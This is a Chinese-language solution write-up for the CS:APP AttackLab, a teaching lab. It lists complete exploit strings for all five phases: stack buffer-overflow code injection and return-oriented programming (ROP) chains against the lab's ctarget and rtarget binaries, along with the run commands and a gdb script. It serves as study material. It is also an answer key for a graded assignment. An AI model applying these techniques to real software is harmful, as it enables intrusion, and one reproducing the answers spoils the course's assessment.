# AttackLab 解题记录（target1）

实验目录：`AttackLab/target1/`，加 `-q` 跳过服务器。

## Phase 1（CTARGET · 代码注入 → touch1 @ 0x4017c0）

40 字节填充 + `touch1` 地址：

```text
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 c0 17 40 00 00 00 00 00
```

运行：

```bash
./hex2raw < exploit.txt | ./ctarget -q
```

## Phase 2（CTARGET · 注入代码 → touch2 @ 0x4017ec）

注入代码：把 cookie `0x59b997fa` 存入 `%edi`，再跳转到 `touch2`：

```text
bf fa 97 b9 59 68 ec 17 40 00 c3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 dc 61 55 00 00 00 00
```

运行：

```bash
./hex2raw < exploit2.txt | ./ctarget -q
```

## Phase 3（CTARGET · 注入代码 → touch3 @ 0x4018fa）

注入代码：把 cookie 字符串 `"59b997fa"` 的地址 `0x5561dca8` 存入 `%rdi`，再跳转到 `touch3`；末尾是字符串数据：

```text
48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00
```

运行：

```bash
./hex2raw < exploit3.txt | ./ctarget -q
```

## Phase 4（RTARGET · ROP → touch2 @ 0x4017ec）

ROP 链：`pop %rdi`（0x4019cc）← cookie → 经 0x4019c5 转入 `%edi` → `touch2`：

```text
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 cc 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 c5 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00
```

运行：

```bash
./hex2raw < exploit4.txt | ./rtarget -q
```

## Phase 5（RTARGET · ROP → touch3 @ 0x4018fa）

ROP 链 + cookie 字符串数据（`"59b997fa"`）：

```text
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1a 40 00 00 00 00 00 c5 19 40 00 00 00 00 00 cc 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 dd 19 40 00 00 00 00 00 69 1a 40 00 00 00 00 00 13 1a 40 00 00 00 00 00 d6 19 40 00 00 00 00 00 c5 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
```

运行：

```bash
./hex2raw < exploit5.txt | ./rtarget -q
```

## gdbscript（用于获取缓冲区地址）

```text
break getbuf
run -q < /dev/null
info registers rsp rdi
quit
```
